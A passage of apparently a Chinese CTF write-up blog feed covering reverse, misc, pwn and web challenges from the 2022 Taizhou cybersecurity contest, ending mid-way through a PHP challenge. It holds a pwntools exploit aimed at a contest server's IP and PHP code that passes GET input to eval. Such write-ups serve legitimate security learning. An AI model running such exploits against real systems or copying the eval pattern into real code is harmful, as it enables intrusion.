title="re2"></a>re2</h2><p>先用<code>pyinstxtractor</code>解包，找到<code>test_obfuscated.pyc</code>，反编译，得到源代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pygame<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> random<br>difficulty = <span class="hljs-number">25</span><br>frame_size_x = <span class="hljs-number">720</span><br>frame_size_y = <span class="hljs-number">480</span><br>check_errors = pygame.init()<br>pygame.display.set_caption(<span class="hljs-string">&#x27;Lets Play&#x27;</span>)<br>game_window = pygame.display.set_mode((frame_size_x, frame_size_y))<br>black = pygame.Color(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>white = pygame.Color(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>)<br>red = pygame.Color(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>green = pygame.Color(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>)<br>blue = pygame.Color(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>fps_controller = pygame.time.Clock()<br>snake_pos = [<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">50</span>]<br>snake_body = [<br>    [<br>        <span class="hljs-number">100</span>,<br>        <span class="hljs-number">50</span>],<br>    [<br>        <span class="hljs-number">90</span>,<br>        <span class="hljs-number">50</span>],<br>    [<br>        <span class="hljs-number">80</span>,<br>        <span class="hljs-number">50</span>]]<br>f_body = [<br>    [<br>        <span class="hljs-number">40</span>,<br>        <span class="hljs-number">29</span>],<br>    [<br>        <span class="hljs-number">40</span>,<br>        <span class="hljs-number">30</span>],<br>    ...<br>    ...<br>    ...<br>    [<br>        <span class="hljs-number">624</span>,<br>        <span class="hljs-number">38</span>]]<br>food_pos = [<br>    random.randrange(<span class="hljs-number">1</span>, frame_size_x // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>,<br>    random.randrange(<span class="hljs-number">1</span>, frame_size_y // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>]<br>food_spawn = <span class="hljs-literal">True</span><br>direction = <span class="hljs-string">&#x27;RIGHT&#x27;</span><br>change_to = direction<br>score = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">game_over</span>():<br>    OOOO000000O000OO0 = pygame.font.SysFont(<span class="hljs-string">&#x27;times new roman&#x27;</span>, <span class="hljs-number">90</span>)<br>    O000O0OO0OO0O0O0O = OOOO000000O000OO0.render(<span class="hljs-string">&#x27;YOU DIED&#x27;</span>, <span class="hljs-literal">True</span>, red)<br>    OOO00OO00O0O00O00 = O000O0OO0OO0O0O0O.get_rect()<br>    OOO00OO00O0O00O00.midtop = (frame_size_x / <span class="hljs-number">2</span>, frame_size_y / <span class="hljs-number">4</span>)<br>    game_window.fill(black)<br>    game_window.blit(O000O0OO0OO0O0O0O, OOO00OO00O0O00O00)<br>    show_score(<span class="hljs-number">0</span>, red, <span class="hljs-string">&#x27;times&#x27;</span>, <span class="hljs-number">20</span>)<br>    pygame.display.flip()<br>    time.sleep(<span class="hljs-number">3</span>)<br>    pygame.quit()<br>    sys.exit()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_score</span>(<span class="hljs-params">OO00000O0O000OO0O, O0O0O0OOOO000O000, O0O0000O00OO00OO0, O0O000OOOOOO00O0O</span>):<br>    O00O000000OO0O0OO = pygame.font.SysFont(O0O0000O00OO00OO0, O0O000OOOOOO00O0O)<br>    O0O0O0O0O0O00O00O = O00O000000OO0O0OO.render(<span class="hljs-string">&#x27;Score : &#x27;</span> + <span class="hljs-built_in">str</span>(score), <span class="hljs-literal">True</span>, O0O0O0OOOO000O000)<br>    O000O0OOOO000OO0O = O0O0O0O0O0O00O00O.get_rect()<br>    <span class="hljs-keyword">if</span> OO00000O0O000OO0O == <span class="hljs-number">1</span>:<br>        O000O0OOOO000OO0O.midtop = (frame_size_x / <span class="hljs-number">10</span>, <span class="hljs-number">15</span>)<br>    <span class="hljs-keyword">else</span>:<br>        O000O0OOOO000OO0O.midtop = (frame_size_x / <span class="hljs-number">2</span>, frame_size_y / <span class="hljs-number">1.25</span>)<br>    game_window.blit(O0O0O0O0O0O00O00O, O000O0OOOO000OO0O)<br><br><span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> pygame.event.get():<br>    <span class="hljs-keyword">if</span> event.<span class="hljs-built_in">type</span> == pygame.QUIT:<br>        pygame.quit()<br>        sys.exit()<br>    <span class="hljs-keyword">elif</span> event.<span class="hljs-built_in">type</span> == pygame.KEYDOWN:<br>        <span class="hljs-keyword">if</span> event.key == pygame.K_UP <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;w&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;UP&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_DOWN <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;s&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;DOWN&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_LEFT <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;LEFT&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_RIGHT <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;d&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;RIGHT&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_ESCAPE:<br>            pygame.event.post(pygame.event.Event(pygame.QUIT))<br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;UP&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;DOWN&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;UP&#x27;</span><br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;DOWN&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;UP&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;DOWN&#x27;</span><br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;LEFT&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;RIGHT&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;LEFT&#x27;</span><br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;RIGHT&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;LEFT&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;RIGHT&#x27;</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;UP&#x27;</span>:<br>    snake_pos[<span class="hljs-number">1</span>] -= <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;DOWN&#x27;</span>:<br>    snake_pos[<span class="hljs-number">1</span>] += <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;LEFT&#x27;</span>:<br>    snake_pos[<span class="hljs-number">0</span>] -= <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;RIGHT&#x27;</span>:<br>    snake_pos[<span class="hljs-number">0</span>] += <span class="hljs-number">10</span><br>snake_body.insert(<span class="hljs-number">0</span>, <span class="hljs-built_in">list</span>(snake_pos))<br><span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">0</span>] == food_pos[<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> snake_pos[<span class="hljs-number">1</span>] == food_pos[<span class="hljs-number">1</span>]:<br>    score += <span class="hljs-number">1</span><br>    food_spawn = <span class="hljs-literal">False</span><br><span class="hljs-keyword">else</span>:<br>    snake_body.pop()<br><span class="hljs-keyword">if</span> score == <span class="hljs-number">1000</span>:<br>    game_window.fill(black)<br>    <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> f_body:<br>        pygame.draw.rect(game_window, green, pygame.Rect(pos[<span class="hljs-number">0</span>], pos[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>    pygame.display.flip()<br>    time.sleep(<span class="hljs-number">10</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> food_spawn:<br>    food_pos = [<br>        random.randrange(<span class="hljs-number">1</span>, frame_size_x // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>,<br>        random.randrange(<span class="hljs-number">1</span>, frame_size_y // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>]<br>food_spawn = <span class="hljs-literal">True</span><br>game_window.fill(black)<br><span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> snake_body:<br>    pygame.draw.rect(game_window, green, pygame.Rect(pos[<span class="hljs-number">0</span>], pos[<span class="hljs-number">1</span>], <span class="hljs-number">10</span>, <span class="hljs-number">10</span>))<br>pygame.draw.rect(game_window, white, pygame.Rect(food_pos[<span class="hljs-number">0</span>], food_pos[<span class="hljs-number">1</span>], <span class="hljs-number">10</span>, <span class="hljs-number">10</span>))<br><span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> snake_pos[<span class="hljs-number">0</span>] &gt; frame_size_x - <span class="hljs-number">10</span>:<br>    game_over()<br><span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> snake_pos[<span class="hljs-number">1</span>] &gt; frame_size_y - <span class="hljs-number">10</span>:<br>    game_over()<br><span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> snake_body[<span class="hljs-number">1</span>:]:<br>    <span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">0</span>] == block[<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> snake_pos[<span class="hljs-number">1</span>] == block[<span class="hljs-number">1</span>]:<br>        game_over()<br>show_score(<span class="hljs-number">1</span>, white, <span class="hljs-string">&#x27;consolas&#x27;</span>, <span class="hljs-number">20</span>)<br>pygame.display.update()<br>fps_controller.tick(difficulty)<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>通过<code>f_body</code>变量中储存的坐标画图得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.new(<span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-number">1000</span>,<span class="hljs-number">1000</span>))<br>f_body=[...]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f_body:<br>    img.putpixel(<span class="hljs-built_in">tuple</span>(i),<span class="hljs-number">255</span>)<br>img.show()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-re2-1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Rank：13，被打爆了&lt;/p&gt;
&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;md5-php&quot;&gt;&lt;a href=&quot;#md5-php&quot; class=&quot;header</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="强国杯" scheme="https://www.lewiserii.top/tags/%E5%BC%BA%E5%9B%BD%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>2022台州市第二届网络安全大赛wp</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2022%E5%8F%B0%E5%B7%9E%E5%B8%82%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2022%E5%8F%B0%E5%B7%9E%E5%B8%82%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp.html</id>
    <published>2022-09-28T06:00:00.000Z</published>
    <updated>2022-11-26T05:41:14.230Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="bitlocker"><a href="#bitlocker" class="headerlink" title="bitlocker"></a>bitlocker</h3><p>内存取证，在内存镜像中搜索<code>txt</code>文件，得到<code>BitLocker</code>恢复密钥</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-misc-1-1.png"></p><p>导出后得到</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs txt">BitLocker 驱动器加密恢复密钥<br><br>恢复密钥用于恢复 BitLocker 保护的驱动器上的数据。<br><br>若要验证该密码是否为正确的恢复密码，请将这些标记与恢复屏幕上显示的标记进行比较。<br><br>恢复密钥标记: 118D5B0A-0C1F-4F<br>完整恢复密钥标记: 118D5B0A-0C1F-4F76-A3B7-01658D566145<br><br>BitLocker 恢复密钥:<br>432696-262691-480018-407649-083578-365651-065142-713999<br></code></pre></td></tr></table></figure><p>在windows7虚拟机上挂载<code>bitlocker.vmdk</code>，使用恢复密钥<code>432696-262691-480018-407649-083578-365651-065142-713999</code>解锁，拿到<code>flag</code>文件</p><p>文件开头为<code>42 4d</code>，判断是bmp文件，但是文件头被修改了</p><p>删掉文件头和文件尾，文件长度除以4后为<code>39949</code>，因式分解得到<code>7*13*439</code>，所以宽高是<code>439*91</code></p><p>用python生成一个宽为439，高为91的rgba格式的bmp文件，和原文件比较，还原文件头，得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-misc-1-2.png"></p><h3 id="皇帝的flag"><a href="#皇帝的flag" class="headerlink" title="皇帝的flag"></a>皇帝的flag</h3><p>crc报错，修改高度，得到二维码，扫码得到<code>‌‌‌‌‍‬‍‍‌‌‌‌‍‌﻿‍‌‌‌‌‍﻿‌‌只有聪明的人才能得到‌‌‌‌‌﻿‌﻿‌‌‌‌‍﻿‌‬flag‌‌‌‌‌﻿‌‌‌‌‌‌‍‍‌‬‌‌‌‌‍‍﻿﻿哦‌‌‌‌‍﻿‌‌‌‌‌‌‍‍‍﻿‌‌‌‌‍‌‍‌</code></p><p>在010中看到很多不可见字符，0宽得到密码<code>eMp3r0R_pWD</code></p><p>stegsolve分析，存在lsb隐写</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-misc-3-1.png"></p><h3 id="列文虎克的秘密"><a href="#列文虎克的秘密" class="headerlink" title="列文虎克的秘密"></a>列文虎克的秘密</h3><p>这是什么题呀，太离谱了，十位密码爆破。100分简单题到结束才三血</p><p><em>赛后复现</em></p><p>先修复<code>zip</code>头，改成<code>50 4B 03 04</code>，然后进行十位数字爆破，得到<code>874375984</code></p><p>图片尾看到<code>oursecret</code>特征块，密码是图片上的列文虎克名字<code>LeEuw3nh0ek</code></p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="EzMath1"><a href="#EzMath1" class="headerlink" title="EzMath1"></a>EzMath1</h3><p>先脱upx壳，在<code>TlsCallback_1</code>函数中找到程序实际用于检测的代码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-reverse1-1.png"></p><p><code>sub_401210</code>函数检测输入的前7个字符</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-reverse1-2.png"></p><p><code>sub_401670</code>函数检测其余输入的字符</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-reverse1-3.png"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>v21=Int(<span class="hljs-string">&#x27;v21&#x27;</span>)<br>v22=Int(<span class="hljs-string">&#x27;v22&#x27;</span>)<br>v23=Int(<span class="hljs-string">&#x27;v23&#x27;</span>)<br>v24=Int(<span class="hljs-string">&#x27;v24&#x27;</span>)<br>v31=Int(<span class="hljs-string">&#x27;v31&#x27;</span>)<br>v32=Int(<span class="hljs-string">&#x27;v32&#x27;</span>)<br>v33=Int(<span class="hljs-string">&#x27;v33&#x27;</span>)<br>s=Solver()<br>s.add(<span class="hljs-number">65</span>*v33+<span class="hljs-number">24</span>*v32+<span class="hljs-number">118</span>*v31+<span class="hljs-number">126</span>*v24+<span class="hljs-number">173</span>*v23+<span class="hljs-number">179</span>*v22+<span class="hljs-number">195</span>*v21==<span class="hljs-number">0xFE5F</span>)<br>s.add(<span class="hljs-number">277</span>*v33+<span class="hljs-number">236</span>*v32+<span class="hljs-number">433</span>*v31+<span class="hljs-number">484</span>*v24+<span class="hljs-number">228</span>*v23+<span class="hljs-number">142</span>*v22+<span class="hljs-number">261</span>*v21==<span class="hljs-number">0x28113</span>)<br>s.add(<span class="hljs-number">496</span>*v33+<span class="hljs-number">309</span>*v32+<span class="hljs-number">46</span>*v31+<span class="hljs-number">135</span>*v24+<span class="hljs-number">165</span>*v23+<span class="hljs-number">7</span>*v22+<span class="hljs-number">495</span>*v21==<span class="hljs-number">152196</span>)<br>s.add(<span class="hljs-number">236</span>*v33+<span class="hljs-number">250</span>*v32+<span class="hljs-number">41</span>*v31+<span class="hljs-number">247</span>*v24+<span class="hljs-number">67</span>*v23+<span class="hljs-number">251</span>*v22+<span class="hljs-number">471</span>*v21==<span class="hljs-number">0x1EFA4</span>)<br>s.add(<span class="hljs-number">457</span>*v33+<span class="hljs-number">414</span>*v32+<span class="hljs-number">271</span>*v31+<span class="hljs-number">32</span>*v24+<span class="hljs-number">244</span>*v23+<span class="hljs-number">74</span>*v22+<span class="hljs-number">113</span>*v21==<span class="hljs-number">0x24273</span>)<br>s.add(<span class="hljs-number">221</span>*v33+<span class="hljs-number">76</span>*v32+<span class="hljs-number">263</span>*v31+<span class="hljs-number">363</span>*v24+<span class="hljs-number">49</span>*v23+<span class="hljs-number">82</span>*v22+<span class="hljs-number">405</span>*v21==<span class="hljs-number">0x1B1AA</span>)<br>s.check()<br>a=<span class="hljs-string">&quot;Yqc77YD8jc&#x27;&#x27;&quot;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br>r=s.model()<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[v21 = 71,</span><br><span class="hljs-string"> v22 = 48,</span><br><span class="hljs-string"> v23 = 100,</span><br><span class="hljs-string"> v24 = 77,</span><br><span class="hljs-string"> v31 = 52,</span><br><span class="hljs-string"> v32 = 116,</span><br><span class="hljs-string"> v33 = 104]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>r=[<span class="hljs-number">71</span>, <span class="hljs-number">48</span>, <span class="hljs-number">100</span>, <span class="hljs-number">77</span>, <span class="hljs-number">52</span>, <span class="hljs-number">116</span>, <span class="hljs-number">104</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r:<br>    e=e+<span class="hljs-built_in">chr</span>(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e=e+<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)^<span class="hljs-number">7</span>))<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-reverse1-4.png"></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="reader"><a href="#reader" class="headerlink" title="reader"></a>reader</h3><p>利用<code>edit</code>中的偏移 向<code>0x4260</code>处写入<code>0x200</code>个字符，可以覆盖<code>stream</code>和<code>filename</code>变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">off,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(off))<br>    p.sendafter(<span class="hljs-string">&#x27;data: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">open</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./reader&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;1.14.97.218&#x27;</span>,<span class="hljs-string">&#x27;22385&#x27;</span>)<br><span class="hljs-built_in">open</span>()<br>read()<br><span class="hljs-comment">#gdb.attach(p,&#x27;b open&#x27;)</span><br>edit(<span class="hljs-number">0x200</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">b&quot;./flag\x00&quot;</span>)<br><span class="hljs-built_in">open</span>()<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-pwn-1-1.png"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="TryGetPasswd"><a href="#TryGetPasswd" class="headerlink" title="TryGetPasswd"></a>TryGetPasswd</h3><p><em>赛后复现</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$passwd</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;passwd&quot;</span>);<br><span class="hljs-comment"># passwd 的格式为 [a-zA-z0-9]&#123;10&#125;</span><br><span class="hljs-variable">$hintfile</span> = <span class="hljs-string">&quot;/tmp/hint&quot;</span>.<span class="hljs-variable">$passwd</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;touch <span class="hljs-subst">$hintfile</span>&quot;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">foreach</span> ((<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>])) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getSize</span>().<span class="hljs-string">&quot;\n&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;passwd&quot;</span>]===<span class="hljs-variable">$passwd</span>)&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>    &#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span 